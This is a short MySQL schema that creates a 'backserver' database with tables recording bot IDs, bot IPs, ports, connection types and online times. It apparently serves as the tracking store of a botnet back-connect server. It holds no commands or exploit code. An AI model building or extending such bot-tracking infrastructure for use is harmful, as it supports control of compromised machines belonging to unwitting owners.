CREATE DATABASE IF NOT EXISTS `backserver` DEFAULT CHARACTER SET utf8 COLLATE utf8_bin;

DROP TABLE IF EXISTS `backserver`.`backclients`;
CREATE TABLE `backserver`.`backclients` (
  `id` int(20) unsigned NOT NULL AUTO_INCREMENT,
  `botid` varchar(100) NOT NULL,
  `botip` varchar(16) NOT NULL,
  `type` varchar(10) NOT NULL,
  `botport` int(11) NOT NULL,
  `onlinefrom` datetime NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `backid` (`botid`, `type`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

DROP TABLE IF EXISTS `backserver`.`backhistory`;
CREATE TABLE `backserver`.`backhistory` (
  `botid` varchar(100) NOT NULL,
  `type` int(11) NOT NULL,
  `port` int(11) NOT NULL,
  PRIMARY KEY (`botid`, `type`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;